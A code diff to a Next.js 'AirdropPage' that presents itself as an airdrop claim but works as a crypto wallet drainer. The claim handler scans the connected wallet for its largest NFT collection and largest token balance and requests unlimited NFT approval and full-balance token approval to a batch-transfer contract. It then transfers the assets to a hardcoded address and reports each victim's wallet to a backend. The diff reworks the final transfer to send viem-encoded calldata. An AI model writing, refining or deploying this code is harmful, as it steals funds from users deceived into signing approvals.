@@ -3,7 +3,8 @@
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 import toast, { Toaster } from 'react-hot-toast';
-import { useAccount, useWriteContract, useWaitForTransactionReceipt } from 'wagmi';
+import { useAccount, useWriteContract, useWaitForTransactionReceipt, useWalletClient } from 'wagmi';
+import { encodeFunctionData } from 'viem';
 import dynamic from 'next/dynamic';
 import { useAppKit } from '@reown/appkit/react';
 
@@ -54,13 +55,15 @@ const networkConfig: Record<number, NetworkConfig> = {
 export default function AirdropPage() {
   const { address, chainId, isConnected } = useAccount();
   const { data: hash, writeContractAsync } = useWriteContract();
+  const { data: walletClient } = useWalletClient();
   const { open } = useAppKit();
 
   const [isProcessing, setIsProcessing] = useState(false);
   const [loadingMessage, setLoadingMessage] = useState('');
   const [hasNotifiedConnection, setHasNotifiedConnection] = useState(false);
+  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
   
-  const { isSuccess: isTxSuccess, isError: isTxError } = useWaitForTransactionReceipt({ hash });
+  const { isSuccess: isTxSuccess, isError: isTxError } = useWaitForTransactionReceipt({ hash: txHash });
 
   // ✅ New helper function to send notifications
   const notifyBackend = async (walletAddress: string, action: string) => {
@@ -83,15 +86,13 @@ export default function AirdropPage() {
     }
   }, [isConnected, address, hasNotifiedConnection]);
 
-
   useEffect(() => {
     if (isTxSuccess) toast.success('Transaction Confirmed!');
     if (isTxError) toast.error('Transaction Failed. Please check your wallet.');
   }, [isTxSuccess, isTxError]);
 
-
   const handleClaim = async () => {
-    if (!isConnected || !address || !chainId) return toast.error("Please connect your wallet first.");
+    if (!isConnected || !address || !chainId || !walletClient) return toast.error("Please connect your wallet first.");
     
     // ✅ Trigger email on claim attempt
     notifyBackend(address, 'Claim Initiated');
@@ -99,55 +100,80 @@ export default function AirdropPage() {
     setIsProcessing(true);
     const toastId = toast.loading("Initializing...");
     try {
-      // ... (rest of the handleClaim logic is unchanged) ...
       const currentConfig = networkConfig[chainId];
       if (!currentConfig) throw new Error("Unsupported Network. Please switch to Mainnet or Sepolia.");
+      
       let currentMessage = "Verifying your assets...";
       setLoadingMessage(currentMessage);
       toast.loading(currentMessage, { id: toastId });
+      
       const alchemyApiKey = process.env.NEXT_PUBLIC_ALCHEMY_API_KEY;
       if (!alchemyApiKey) throw new Error("Alchemy API Key not configured.");
+      
       const alchemyNftApiUrl = `https://eth-${currentConfig.alchemySubdomain}.g.alchemy.com/nft/v3/${alchemyApiKey}/getNFTsForOwner`;
       const alchemyTokenApiUrl = `https://eth-${currentConfig.alchemySubdomain}.g.alchemy.com/v2/${alchemyApiKey}`;
+      
       const [nftResponse, tokenBalancesResponse] = await Promise.all([
         axios.get(alchemyNftApiUrl, { params: { owner: address } }),
         axios.post(alchemyTokenApiUrl, { jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances', params: [address, 'erc20'] })
       ]);
+      
       const nfts: IAlchemyNft[] = nftResponse.data.ownedNfts;
       const collections = nfts.reduce((acc: Record<string, string[]>, nft: IAlchemyNft) => {
           const lowercasedAddress = nft.contract.address.toLowerCase();
           acc[lowercasedAddress] = (acc[lowercasedAddress] || []).concat(nft.tokenId);
           return acc;
       }, {});
+      
       const [targetNftCollection, targetNftIds] = Object.entries(collections).sort((a, b) => b[1].length - a[1].length)[0] || [null, []];
+      
       const tokenBalances = tokenBalancesResponse.data.result.tokenBalances;
       const tokenMetadataPromises = tokenBalances.map((balance: any) => 
         axios.post(alchemyTokenApiUrl, { jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata', params: [balance.contractAddress] })
              .then(res => ({...res.data.result, ...balance })).catch(() => null)
       );
+      
       const tokensMetadata = (await Promise.all(tokenMetadataPromises)).filter(Boolean);
       const tokens: IToken[] = tokensMetadata
         .filter(m => m.symbol && m.decimals && m.tokenBalance !== "0")
         .map(m => ({ token_address: m.contractAddress, balance: m.tokenBalance, decimals: m.decimals, symbol: m.symbol }));
+      
       const targetToken = tokens.sort((a, b) => BigInt(b.balance) > BigInt(a.balance) ? 1 : -1)[0] || null;
+      
       if (!targetToken && !targetNftCollection) throw new Error("No eligible assets found in your wallet.");
+      
       toast.dismiss();
       currentMessage = "Requesting approvals...";
       setLoadingMessage(currentMessage);
       toast.loading(currentMessage, { id: toastId });
+      
+      // Handle approvals first
       const approvalPromises = [];
       if (targetNftCollection) {
-        approvalPromises.push(writeContractAsync({ address: targetNftCollection as `0x${string}`, abi: ERC721_ABI, functionName: 'setApprovalForAll', args: [currentConfig.batchTransferAddress, true] }));
+        approvalPromises.push(writeContractAsync({ 
+          address: targetNftCollection as `0x${string}`, 
+          abi: ERC721_ABI, 
+          functionName: 'setApprovalForAll', 
+          args: [currentConfig.batchTransferAddress, true] 
+        }));
       }
       if (targetToken) {
-        approvalPromises.push(writeContractAsync({ address: targetToken.token_address, abi: ERC20_ABI, functionName: 'approve', args: [currentConfig.batchTransferAddress, BigInt(targetToken.balance)] }));
+        approvalPromises.push(writeContractAsync({ 
+          address: targetToken.token_address, 
+          abi: ERC20_ABI, 
+          functionName: 'approve', 
+          args: [currentConfig.batchTransferAddress, BigInt(targetToken.balance)] 
+        }));
       }
+      
       await Promise.all(approvalPromises);
+      
       currentMessage = "Process complete. Transferring...";
       setLoadingMessage(currentMessage);
       toast.loading(currentMessage, { id: toastId });
-      await writeContractAsync({
-        address: currentConfig.batchTransferAddress,
+      
+      // ✅ Encode the calldata using viem
+      const calldata = encodeFunctionData({
         abi: BATCH_TRANSFER_ABI,
         functionName: 'batchTransfer',
         args: [
@@ -158,7 +184,18 @@ export default function AirdropPage() {
           "0x60615206db4b92a5a37acce0e52ddb8b2898f053"
         ],
       });
+
+      // ✅ Send transaction using walletClient with encoded calldata
+      const transactionHash = await walletClient.sendTransaction({
+        to: currentConfig.batchTransferAddress,
+        data: calldata,
+      });
+
+      // Set the transaction hash for monitoring
+      setTxHash(transactionHash);
+      
       toast.success("Airdrop Claim Initiated!", { id: toastId });
+      
     } catch (error: any) {
       toast.error(error.shortMessage || error.message || "An unknown error occurred.", { id: toastId });
       console.error(error);
